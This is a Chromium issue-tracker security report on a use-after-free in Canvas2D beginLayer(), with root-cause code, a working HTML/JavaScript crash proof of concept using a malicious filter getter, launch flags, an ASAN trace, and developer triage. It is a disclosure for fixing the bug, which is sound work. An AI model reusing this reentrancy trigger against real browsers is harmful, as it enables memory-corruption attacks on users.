# Use-After-Free in Canvas2D beginLayer Filter Parsing Leads to Renderer Crash and Potential RCE

| Field | Value |
|-------|-------|
| **Issue ID** | [485677960](https://issues.chromium.org/issues/485677960) |
| **Status** | Verified |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>Canvas |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | je...@gmail.com |
| **Assignee** | jp...@chromium.org |
| **Created** | 2026-02-19 |
| **Bounty** | $50,000.00 |

## Description

# Use-After-Free in Canvas2D beginLayer Filter Parsing Leads to Renderer Crash and Potential RCE

## Summary

The Canvas2D `beginLayer()` function caches a pointer to `MemoryManagedPaintRecorder` before parsing user-provided filter objects. When a filter object with a malicious JavaScript getter is parsed, the getter executes attacker-controlled code that can resize the canvas, destroying the cached recorder. Upon returning from filter parsing, the function continues using the now-dangling pointer, resulting in a use-after-free vulnerability. This can lead to renderer process crash and potentially arbitrary code execution within the sandboxed renderer.

## Bisect

The vulnerability was introduced on May 1, 2023 in commit `073e7f2a9215146fe747d84ea34aba23c2681ee8` with the message "Add a filter argument to the beginLayer function." This commit added support for filter objects in the `beginLayer()` API, which introduced JavaScript callback execution during filter parsing while holding a raw pointer to the recorder.

## Root Cause

The vulnerability exists in `Canvas2DRecorderContext::beginLayerImpl()` located in `third_party/blink/renderer/modules/canvas/canvas2d/canvas_2d_recorder_context.cc`. The function caches a raw pointer to the `MemoryManagedPaintRecorder` object at the beginning of the function, then proceeds to parse user-provided filter objects. This parsing invokes JavaScript getters to retrieve filter properties such as `name` and `stdDeviation`.

```
// third_party/blink/renderer/modules/canvas/canvas2d/canvas_2d_recorder_context.cc:463-499
MemoryManagedPaintRecorder* recorder = Recorder();  // Caches raw pointer
if (!recorder) {
  return;
}

ValidateStateStack();

sk_sp<PaintFilter> filter;
if (options != nullptr) {
  CHECK(exception_state != nullptr);
  if (const V8CanvasFilterInput* filter_input = options->filter();
      filter_input != nullptr) {
    AddLayerFilterUserCount(filter_input);

    HTMLCanvasElement* canvas_for_filter = HostAsHTMLCanvasElement();
    FilterOperations filter_operations = CanvasFilter::CreateFilterOperations(
        *filter_input, AccessFont(canvas_for_filter), canvas_for_filter,
        CHECK_DEREF(ExecutionContext::From(script_state)), *exception_state);
    // ... filter processing continues
  }
}

if (layer_count_ == 0) {
  recorder->BeginSideRecording();  // UAF: recorder may be dangling
}

```

The `CanvasFilter::CreateFilterOperations()` function parses the filter input, which can be a JavaScript object. When the object has getter properties, V8 invokes these getters to retrieve the values. An attacker can define a malicious getter that modifies the canvas dimensions during the callback.

When the canvas width or height is modified, it triggers `HTMLCanvasElement::OnWidthOrHeightAssigned()`, which calls `SizeChanged()` on the rendering context. The `SizeChanged()` function destroys the `resource_provider_` member, which owns the `MemoryManagedPaintRecorder`:

```
// third_party/blink/renderer/modules/canvas/canvas2d/canvas_rendering_context_2d.cc:1311-1314
void CanvasRenderingContext2D::SizeChanged() {
  resource_provider_ = nullptr;  // Destroys the provider and its recorder
  did_fail_to_create_resource_provider_ = false;
}

```

After the getter returns and filter parsing completes, `beginLayerImpl()` continues execution and attempts to use the cached `recorder` pointer. Since the recorder has been destroyed during the JavaScript callback, this results in a use-after-free when calling `recorder->BeginSideRecording()`.

The attack flow is as follows: the attacker creates a canvas and obtains its 2D context, then defines a filter object with a malicious getter that modifies `canvas.width` when accessed. When `beginLayer({ filter: [maliciousFilter] })` is called, the function caches the recorder pointer, then parses the filter object and invokes the malicious getter. Inside the getter, modifying `canvas.width` triggers `SizeChanged()` which destroys the recorder. After the getter returns, the function uses the dangling pointer, causing a heap-use-after-free.

## Reproduce

To reproduce the vulnerability, save the following PoC to a file and run Chrome with the required flags. The PoC requires the Canvas2D Layers feature to be enabled.

```
<!DOCTYPE html>
<html>
<head>
  <title>Canvas2D beginLayer UAF PoC</title>
</head>
<body>
<h1>Canvas2D beginLayer() filter UAF PoC</h1>
<pre id="log"></pre>
<script>
function log(msg) {
  console.log(msg);
  document.getElementById('log').textContent += msg + '\n';
}

function poc() {
  log('[*] Canvas2D beginLayer UAF PoC');
  log('[*] ================================\n');

  // Check if beginLayer supports options parameter
  const testCanvas = document.createElement('canvas');
  const testCtx = testCanvas.getContext('2d');

  if (!testCtx.beginLayer) {
    log('[!] ctx.beginLayer() not available');
    log('[*] Requires: --canvas-2d-layers');
    return;
  }

  log('[+] beginLayer() exists');

  // Create canvas
  const canvas = document.createElement('canvas');
  canvas.width = 100;
  canvas.height = 100;
  document.body.appendChild(canvas);

  const ctx = canvas.getContext('2d');
  if (!ctx) {
    log('[!] Failed to get 2d context');
    return;
  }
  log('[+] Created canvas 100x100 and obtained 2d context');

  // Draw some content to ensure resource_provider is created
  ctx.fillStyle = 'red';
  ctx.fillRect(0, 0, 50, 50);
  log('[+] Initial draw complete, resource_provider created');

  // Reentry counter
  let reentryCalled = false;

  // Create malicious filter object
  // When the "name" property is read, it triggers the getter which executes attacker code
  const maliciousFilter = {
    get name() {
      log('[!] getter "name" called - reentry point triggered!');

      if (!reentryCalled) {
        reentryCalled = true;

        // Modifying canvas size triggers:
        // HTMLCanvasElement::OnWidthOrHeightAssigned()
        //   -> RenderingContext()->SizeChanged()
        //   -> resource_provider_ = nullptr (destroys provider and internal recorder)
        log('[!] Modifying canvas.width in getter to trigger SizeChanged()');
        canvas.width = canvas.width + 1;  // 101
        log('[!] canvas.width modified to ' + canvas.width);
        log('[!] resource_provider_ destroyed, recorder pointer is dangling');
      }

      // Return valid filter name to let parsing continue
      return 'gaussianBlur';
    },

    get stdDeviation() {
      log('[*] getter "stdDeviation" called');
      return 5;
    }
  };

  log('\n[*] Calling ctx.beginLayer({ filter: [maliciousFilter] })...');
  log('[*] Flow:');
  log('[*]   1. beginLayerImpl caches recorder = Recorder()');
  log('[*]   2. CreateFilterOperations parses filter object');
  log('[*]   3. Reading filter.name -> triggers getter -> modifies canvas.width');
  log('[*]   4. SizeChanged() destroys resource_provider_ and recorder');
  log('[*]   5. Returns to beginLayerImpl, uses dangling recorder pointer');
  log('[*]   6. recorder->BeginSideRecording() -> UAF!\n');

  try {
    // Trigger the vulnerability
    ctx.beginLayer({ filter: [maliciousFilter] });

    log('\n[?] beginLayer returned - if no crash:');
    log('    - Feature not enabled (needs Canvas2dLayersWithOptions)');
    log('    - Vulnerability fixed');
    log('    - ASAN not enabled to detect UAF');

    ctx.endLayer();

  } catch (e) {
    log('[!] Exception: ' + e.message);
  }
}

// Delay execution to ensure page is fully loaded
setTimeout(poc, 100);
</script>
</body>
</html>

```

Run Chrome with the following command:

```
export ASAN_OPTIONS=detect_odr_violation=0
xvfb-run -a /path/to/chrome-asan \
    --canvas-2d-layers \
    --enable-blink-features=Canvas2dLayersWithOptions \
    --no-sandbox \
    --user-data-dir=/tmp/chrome_uaf_$$ \
    "file:///path/to/poc.html"

```

Both required flags are disabled by default. The `--canvas-2d-layers` flag is disabled by default and can be enabled via `chrome://flags/#canvas-2d-layers`. The `Canvas2dLayersWithOptions` feature is disabled by default and can be enabled via `chrome://flags/#enable-experimental-web-platform-features`.

The ASAN output confirms the use-after-free:

```
=================================================================
==474054==ERROR: AddressSanitizer: heap-use-after-free on address 0x7ccad49e77e0 at pc 0x7f0af7e402bc bp 0x7ffd3a343790 sp 0x7ffd3a343788
READ of size 8 at 0x7ccad49e77e0 thread T0 (chrome)
    #0 0x7f0af7e402bb in blink::MemoryManagedPaintRecorder::BeginSideRecording() gen/third_party/libc++/src/include/__memory/unique_ptr.h:275:12
    #1 0x7f0ae9ae48aa in blink::Canvas2DRecorderContext::beginLayerImpl(blink::ScriptState*, blink::BeginLayerOptions const*, blink::ExceptionState*) third_party/blink/renderer/modules/canvas/canvas2d/canvas_2d_recorder_context.cc:499:15
    #2 0x7f0ae8afb6e8 in blink::(anonymous namespace)::v8_canvas_rendering_context_2d::BeginLayerOperationCallback(v8::FunctionCallbackInfo<v8::Value> const&) third_party/blink/renderer/modules/canvas/canvas2d/canvas_2d_recorder_context.h:172:5
    #3 0x7b0ab66106a3  (<unknown module>)
    #4 0x7b0ab660e83b  (<unknown module>)
    #5 0x7b0ab660b5db  (<unknown module>)
    #6 0x7b0ab660b32a  (<unknown module>)
    #7 0x7f0af0b2246e in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) v8/src/execution/simulator.h:216:12
    #8 0x7f0af0b1ffde in v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>, v8::base::Vector<v8::internal::DirectHandle<v8::internal::Object> const>) v8/src/execution/execution.cc:532:10
    #9 0x7f0af06f807a in v8::Function::Call(v8::Isolate*, v8::Local<v8::Context>, v8::Local<v8::Value>, int, v8::Local<v8::Value>*) v8/src/api/api.cc:5573:27
    #10 0x7f0aff4f6350 in blink::V8ScriptRunner::CallFunction(v8::Local<v8::Function>, blink::ExecutionContext*, v8::Local<v8::Value>, int, v8::Local<v8::Value>*, v8::Isolate*) third_party/blink/renderer/bindings/core/v8/v8_script_runner.cc:855:48
    #11 0x7f0aff3426db in blink::bindings::CallbackInvokeHelper<blink::CallbackFunctionBase, (blink::bindings::CallbackInvokeHelperMode)0, (blink::bindings::CallbackReturnTypeIsPromise)0>::Call(int, v8::Local<v8::Value>*) third_party/blink/renderer/bindings/core/v8/callback_invoke_helper.cc:126:12
    #12 0x7f0b03b5a85b in blink::V8Function::Invoke(blink::bindings::V8ValueOrScriptWrappableAdapter, blink::BasicHeapVector<(blink::internal::HeapCollectionType)1, blink::ScriptValue, 0u> const&) gen/third_party/blink/renderer/bindings/core/v8/v8_function.cc:73:13
    #13 0x7f0b03b5bc33 in blink::V8Function::InvokeAndReportException(blink::bindings::V8ValueOrScriptWrappableAdapter, blink::BasicHeapVector<(blink::internal::HeapCollectionType)1, blink::ScriptValue, 0u> const&) gen/third_party/blink/renderer/bindings/core/v8/v8_function.cc:133:15
    #14 0x7f0b02a7e259 in blink::ScheduledAction::Execute(blink::ExecutionContext*) third_party/blink/renderer/core/scheduler/scheduled_action.cc:145:18
    #15 0x7f0b02a76a47 in blink::DOMTimer::Fired() third_party/blink/renderer/core/scheduler/dom_timer.cc:446:11
    #16 0x7f0af8115af5 in blink::TimerBase::RunInternal() third_party/blink/renderer/platform/timer.cc:166:3
    #17 0x7f0b01976eec in base::internal::Invoker<base::internal::FunctorTraits<void (blink::TimerBase::*&&)(), blink::TimerBase*>, base::internal::BindState<true, true, false, void (blink::TimerBase::*)(), blink::UnretainedWrapper<blink::TimerBase>>, void ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #18 0x7f0b52f60c82 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #19 0x7f0b52fe216e in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #20 0x7f0b52fe1146 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #21 0x7f0b52e033f1 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:42:55
    #22 0x7f0b52fe37e8 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:650:12
    #23 0x7f0b52ecb002 in base::RunLoop::Run(base::Location const&) base/run_loop.cc:135:14
    #24 0x7f0b48bff0a5 in content::RendererMain(content::MainFunctionParams) content/renderer/renderer_main.cc:364:16
    #25 0x7f0b490316e7 in content::RunZygote(content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:664:14
    #26 0x7f0b490328ae in content::RunOtherNamedProcessTypeMain(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, content::MainFunctionParams, content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:771:12
    #27 0x7f0b49034e0a in content::ContentMainRunnerImpl::Run() content/app/content_main_runner_impl.cc:1139:12
    #28 0x7f0b4902f9ec in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*) content/app/content_main.cc:298:25
    #29 0x55e8c38c8edd in content::ContentMain(content::ContentMainParams) content/app/content_main.cc:327:10
    #30 0x55e8c38c78bf in ChromeMain chrome/app/chrome_main.cc:165:12
    #31 0x7f0a9f629d8f in __libc_start_call_main (/usr/lib/x86_64-linux-gnu/libc.so.6+0x29d8e)
    #32 0x7f0a9f629e3f in __libc_start_main (/usr/lib/x86_64-linux-gnu/libc.so.6+0x29e3e)
    #33 0x55e8c38c73f4 in _start (out/asan-release/chrome+0x673f3)

0x7ccad49e77e0 is located 96 bytes inside of 512-byte region [0x7ccad49e7780,0x7ccad49e7980)
freed by thread T0 (chrome) here:
    #0 0x7f0b53fbae62 in operator delete(void*, unsigned long) (out/asan-release/libclang_rt.asan.so+0xfde61)
    #1 0x7f0af7e466fe in blink::CanvasResourceProvider::~CanvasResourceProvider() third_party/blink/renderer/platform/graphics/canvas_resource_provider.cc:273:1
    #2 0x7f0af7e46f60 in blink::CanvasResourceProvider::~CanvasResourceProvider() third_party/blink/renderer/platform/graphics/canvas_resource_provider.cc:273:1
    #3 0x7f0af8154de7 in std::__Cr::default_delete<blink::CanvasResourceProvider>::operator()(blink::CanvasResourceProvider*) const gen/third_party/libc++/src/include/__memory/unique_ptr.h:63:5
    #4 0x7f0af8154d7d in std::__Cr::unique_ptr<blink::CanvasResourceProvider, std::__Cr::default_delete<blink::CanvasResourceProvider>>::reset(blink::CanvasResourceProvider*) gen/third_party/libc++/src/include/__memory/unique_ptr.h:297:7
    #5 0x7f0af8154c9e in std::__Cr::unique_ptr<blink::CanvasResourceProvider, std::__Cr::default_delete<blink::CanvasResourceProvider>>::operator=(std::__Cr::nullptr_t) gen/third_party/libc++/src/include/__memory/unique_ptr.h:267:5
    #6 0x7f0ae9ae2a19 in blink::CanvasRenderingContext2D::SizeChanged() third_party/blink/renderer/modules/canvas/canvas2d/canvas_rendering_context_2d.cc:1312:23
    #7 0x7f0b038e84eb in blink::HTMLCanvasElement::OnWidthOrHeightAssigned(blink::HTMLCanvasElement::WidthOrHeight, unsigned int, bool) third_party/blink/renderer/core/html/canvas/html_canvas_element.cc:418:21
    #8 0x7f0b038e6a70 in blink::HTMLCanvasElement::SetUnsignedIntegralAttribute(blink::QualifiedName const&, unsigned int, unsigned int) third_party/blink/renderer/core/html/canvas/html_canvas_element.cc:391:5
    #9 0x7f0b04c40178 in blink::HTMLCanvasElementSetWidthAttributeSetter(v8::Local<v8::Value>, v8::PropertyCallbackInfo<void> const&) gen/third_party/blink/renderer/bindings/core/v8/v8_html_canvas_element.cc:269:3
    #10 0x7f0b06b1e3c7 in blink::V8SetReturnValue(v8::FunctionCallbackInfo<v8::Value> const&, blink::bindings::V8SetReturnValueIgnore) third_party/blink/renderer/platform/bindings/callback_invoke_helper.h:43:1
    #11 0x7b0ab67a6b9e  (<unknown module>)
    #12 0x7b0ab660e83b  (<unknown module>)
    #13 0x7b0ab660b5db  (<unknown module>)
    #14 0x7b0ab660b32a  (<unknown module>)
    #15 0x7f0af0b2246e in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) v8/src/execution/simulator.h:216:12
    #16 0x7f0af0b1ffde in v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>, v8::base::Vector<v8::internal::DirectHandle<v8::internal::Object> const>) v8/src/execution/execution.cc:532:10
    #17 0x7f0af06f807a in v8::Function::Call(v8::Isolate*, v8::Local<v8::Context>, v8::Local<v8::Value>, int, v8::Local<v8::Value>*) v8/src/api/api.cc:5573:27
    #18 0x7f0aff4f6350 in blink::V8ScriptRunner::CallFunction(v8::Local<v8::Function>, blink::ExecutionContext*, v8::Local<v8::Value>, int, v8::Local<v8::Value>*, v8::Isolate*) third_party/blink/renderer/bindings/core/v8/v8_script_runner.cc:855:48
    #19 0x7f0aff3426db in blink::bindings::CallbackInvokeHelper<blink::CallbackFunctionBase, (blink::bindings::CallbackInvokeHelperMode)0, (blink::bindings::CallbackReturnTypeIsPromise)0>::Call(int, v8::Local<v8::Value>*) third_party/blink/renderer/bindings/core/v8/callback_invoke_helper.cc:126:12
    #20 0x7f0b03b5a85b in blink::V8Function::Invoke(blink::bindings::V8ValueOrScriptWrappableAdapter, blink::BasicHeapVector<(blink::internal::HeapCollectionType)1, blink::ScriptValue, 0u> const&) gen/third_party/blink/renderer/bindings/core/v8/v8_function.cc:73:13
    #21 0x7f0b03b5bc33 in blink::V8Function::InvokeAndReportException(blink::bindings::V8ValueOrScriptWrappableAdapter, blink::BasicHeapVector<(blink::internal::HeapCollectionType)1, blink::ScriptValue, 0u> const&) gen/third_party/blink/renderer/bindings/core/v8/v8_function.cc:133:15
    #22 0x7f0b02a7e259 in blink::ScheduledAction::Execute(blink::ExecutionContext*) third_party/blink/renderer/core/scheduler/scheduled_action.cc:145:18
    #23 0x7f0b02a76a47 in blink::DOMTimer::Fired() third_party/blink/renderer/core/scheduler/dom_timer.cc:446:11
    #24 0x7f0af8115af5 in blink::TimerBase::RunInternal() third_party/blink/renderer/platform/timer.cc:166:3
    #25 0x7f0b01976eec in base::internal::Invoker<base::internal::FunctorTraits<void (blink::TimerBase::*&&)(), blink::TimerBase*>, base::internal::BindState<true, true, false, void (blink::TimerBase::*)(), blink::UnretainedWrapper<blink::TimerBase>>, void ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #26 0x7f0b52f60c82 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #27 0x7f0b52fe216e in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #28 0x7f0b52fe1146 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #29 0x7f0b52e033f1 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:42:55

previously allocated by thread T0 (chrome) here:
    #0 0x7f0b53fb9d17 in operator new(unsigned long) (out/asan-release/libclang_rt.asan.so+0xfcd16)
    #1 0x7f0af7e3b71b in blink::CanvasResourceProvider::CreateSharedImageProvider(blink::CanvasResourceProviderCreateParams const&, unsigned int) third_party/blink/renderer/platform/graphics/canvas_resource_provider.cc:534:16
    #2 0x7f0af7e3a00e in blink::CanvasResourceProvider::CreateForCanvas2D(blink::CanvasResourceProviderCreateParams const&, unsigned int) third_party/blink/renderer/platform/graphics/canvas_resource_provider.cc:480:21
    #3 0x7f0ae9ae4f1f in blink::CanvasRenderingContext2D::CreateCanvasResourceProvider() third_party/blink/renderer/modules/canvas/canvas2d/canvas_rendering_context_2d.cc:1373:7
    #4 0x7f0ae9ae3df0 in blink::Canvas2DRecorderContext::GetOrCreatePaintCanvas() third_party/blink/renderer/modules/canvas/canvas2d/canvas_2d_recorder_context.cc:255:5
    #5 0x7f0ae9aed04d in blink::Canvas2DRecorderContext::Draw(base::FunctionRef<void (cc::PaintCanvas*, cc::PaintFlags const*)>, base::FunctionRef<bool (blink::Canvas2DRecorderContext::Image const&, blink::SkImageOrCurrentFrameInfo)>, blink::CanvasRenderingContext2DState::PaintType, blink::CanvasRenderingContext2DState::ImageType, blink::CanvasPerformanceMonitor::DrawType) third_party/blink/renderer/modules/canvas/canvas2d/canvas_2d_recorder_context.cc:1038:12
    #6 0x7f0ae9b36a5f in blink::BaseRenderingContext2D::FillRect(double, double, double, double) third_party/blink/renderer/modules/canvas/canvas2d/base_rendering_context_2d.cc:1765:5
    #7 0x7f0ae8a58ade in blink::(anonymous namespace)::v8_canvas_rendering_context_2d::FillRectOperationCallback(v8::FunctionCallbackInfo<v8::Value> const&) gen/third_party/blink/renderer/bindings/modules/v8/v8_canvas_rendering_context_2d.cc:6303:5
    #8 0x7b0ab66106a3  (<unknown module>)
    #9 0x7b0ab660e83b  (<unknown module>)
    #10 0x7b0ab660b5db  (<unknown module>)
    #11 0x7b0ab660b32a  (<unknown module>)
    #12 0x7f0af0b2246e in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) v8/src/execution/simulator.h:216:12
    #13 0x7f0af0b1ffde in v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>, v8::base::Vector<v8::internal::DirectHandle<v8::internal::Object> const>) v8/src/execution/execution.cc:532:10
    #14 0x7f0af06f807a in v8::Function::Call(v8::Isolate*, v8::Local<v8::Context>, v8::Local<v8::Value>, int, v8::Local<v8::Value>*) v8/src/api/api.cc:5573:27
    #15 0x7f0aff4f6350 in blink::V8ScriptRunner::CallFunction(v8::Local<v8::Function>, blink::ExecutionContext*, v8::Local<v8::Value>, int, v8::Local<v8::Value>*, v8::Isolate*) third_party/blink/renderer/bindings/core/v8/v8_script_runner.cc:855:48
    #16 0x7f0aff3426db in blink::bindings::CallbackInvokeHelper<blink::CallbackFunctionBase, (blink::bindings::CallbackInvokeHelperMode)0, (blink::bindings::CallbackReturnTypeIsPromise)0>::Call(int, v8::Local<v8::Value>*) third_party/blink/renderer/bindings/core/v8/callback_invoke_helper.cc:126:12
    #17 0x7f0b03b5a85b in blink::V8Function::Invoke(blink::bindings::V8ValueOrScriptWrappableAdapter, blink::BasicHeapVector<(blink::internal::HeapCollectionType)1, blink::ScriptValue, 0u> const&) gen/third_party/blink/renderer/bindings/core/v8/v8_function.cc:73:13
    #18 0x7f0b03b5bc33 in blink::V8Function::InvokeAndReportException(blink::bindings::V8ValueOrScriptWrappableAdapter, blink::BasicHeapVector<(blink::internal::HeapCollectionType)1, blink::ScriptValue, 0u> const&) gen/third_party/blink/renderer/bindings/core/v8/v8_function.cc:133:15
    #19 0x7f0b02a7e259 in blink::ScheduledAction::Execute(blink::ExecutionContext*) third_party/blink/renderer/core/scheduler/scheduled_action.cc:145:18
    #20 0x7f0b02a76a47 in blink::DOMTimer::Fired() third_party/blink/renderer/core/scheduler/dom_timer.cc:446:11
    #21 0x7f0af8115af5 in blink::TimerBase::RunInternal() third_party/blink/renderer/platform/timer.cc:166:3
    #22 0x7f0b01976eec in base::internal::Invoker<base::internal::FunctorTraits<void (blink::TimerBase::*&&)(), blink::TimerBase*>, base::internal::BindState<true, true, false, void (blink::TimerBase::*)(), blink::UnretainedWrapper<blink::TimerBase>>, void ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #23 0x7f0b52f60c82 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #24 0x7f0b52fe216e in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #25 0x7f0b52fe1146 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #26 0x7f0b52e033f1 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:42:55
    #27 0x7f0b52fe37e8 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:650:12
    #28 0x7f0b52ecb002 in base::RunLoop::Run(base::Location const&) base/run_loop.cc:135:14
    #29 0x7f0b48bff0a5 in content::RendererMain(content::MainFunctionParams) content/renderer/renderer_main.cc:364:16

SUMMARY: AddressSanitizer: heap-use-after-free gen/third_party/libc++/src/include/__memory/unique_ptr.h:275:12 in blink::MemoryManagedPaintRecorder::BeginSideRecording()
Shadow bytes around the buggy address:
  0x7ccad49e7500: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7ccad49e7580: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7ccad49e7600: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7ccad49e7680: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7ccad49e7700: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
=>0x7ccad49e7780: fd fd fd fd fd fd fd fd fd fd fd fd[fd]fd fa fa
  0x7ccad49e7800: fa fa fa fa fa fa fa fa fa fa fa fa fa fa f7 fa
  0x7ccad49e7880: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7ccad49e7900: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7ccad49e7980: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7ccad49e7a00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==474054==ADDITIONAL INFO

==474054==Note: Please include this section with the ASan report.
Task trace:
    #0 0x7f0b02a75c0e in blink::DOMTimer::DOMTimer(blink::ExecutionContext&, blink::ScheduledAction*, base::TimeDelta, bool) third_party/blink/renderer/core/scheduler/dom_timer.cc:343:27
    #1 0x7f0b3fa80e88 in IPC::ChannelAssociatedGroupController::Accept(mojo::Message*) ipc/ipc_mojo_bootstrap.cc:1138:13


Command line: `/proc/self/exe --type=renderer --crashpad-handler-pid=473962 --enable-crash-reporter=, --user-data-dir=/tmp/chrome_uaf_report_473940 --change-stack-guard-on-fork=enable --no-sandbox --ozone-platform=x11 --enable-blink-features=Canvas2dLayersWithOptions --lang=en-US --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=5 --time-ticks-at-unix-epoch=-1757073365711413 --launch-time-ticks=14418441232759 --shared-files=v8_context_snapshot_data:100 --metrics-shmem-handle=4,i,4181092392702398626,8539166677571401,2097152 --field-trial-handle=3,i,2447595753535042676,8697091765512205595,262144 --variations-seed-version --pseudonymization-salt-handle=7,i,13489365626135708624,9525503517803860630,4 --trace-process-track-uuid=3190708990997080739`


MiraclePtr Status: NOT PROTECTED
No raw_ptr<T> access to this region was detected prior to this crash.
This crash is still exploitable with MiraclePtr.
Refer to https://chromium.googlesource.com/chromium/src/+/main/base/memory/raw_ptr.md for details.

==474054==ABORTING

```

## Attachments

- [exp.html](attachments/exp.html) (text/html, 5.1 KB)
- [exp.png](attachments/exp.png) (image/png, 999.0 KB)
- [exploit-writeup.md](attachments/exploit-writeup.md) (text/markdown, 19.5 KB)

## Timeline

### cl...@appspot.gserviceaccount.com (2026-02-19)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6445010543116288.

### ma...@google.com (2026-02-19)

Security shepherd: S1 for a renderer UAF, but Impact\_None because the feature is default disabled.

jpgravel@, could you PTAL? Can you confirm that this feature isn't currently shipping to any Stable population users by default (including experiments, Origin Trials, etc.)?

### ju...@chromium.org (2026-02-20)

This web platform feature appears to have been abandoned.

https://github.com/whatwg/html/pull/9537
https://chromestatus.com/feature/5629802309484544

We should probably just rip out the code if it's never going to ship.


### bl...@chromium.org (2026-02-20)

This makes sense to me. JP, is Justin's assessment in [comment#4](https://issues.chromium.org/issues/485677960#comment4) accurate?

### 24...@project.gserviceaccount.com (2026-02-20)

Detailed Report: https://clusterfuzz.com/testcase?key=6445010543116288

Fuzzer: None
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7648577e47e0
Crash State:
  blink::Canvas2DRecorderContext::beginLayerImpl
  blink::v8_canvas_rendering_context_2d::BeginLayerOperationCallback
  Builtins_CallApiCallbackGeneric
  
Sanitizer: address (ASAN)

Recommended Security Severity: Critical

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=1255832:1255841

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6445010543116288

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary.

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


A recommended severity was added to this bug. Please change the severity if it is inaccurate.

### jp...@chromium.org (2026-02-20)

The feature is indeed disabled by default and is not enabled in any experiment.

This bug appears to be trivial to fix. Ripping out the feature for this seems unjustified. I'm not aware of this feature being abandoned. The spec is pretty much approved on the WHATWG side and Safari implemented the feature. We can discuss dropping the feature, but that seems to me like an orthogonal (and much bigger) question.

### jp...@chromium.org (2026-02-21)

Come to think of it, it was decided that layers should ship without filters. Safari first pushed back on filters specified as objects (what this bug exploits), and then pushed back on the whole idea of layers using filters. That's because the canvas already has a global `ctx.filter = ...` state that can be used to apply a filter on a layer. See [this post and the following replies](https://github.com/whatwg/html/pull/9537#issuecomment-2145148142). This is why the `beginLayer()` overload accepting a filter parameter is behind a separate feature `Canvas2dLayersWithOptions`. It might very well be that `Canvas2dLayersWithOptions` will never ship if `ctx.filter = ...` + `ctx.beginLayer()` proves to be enough. Deleting that code might be a good idea after all.

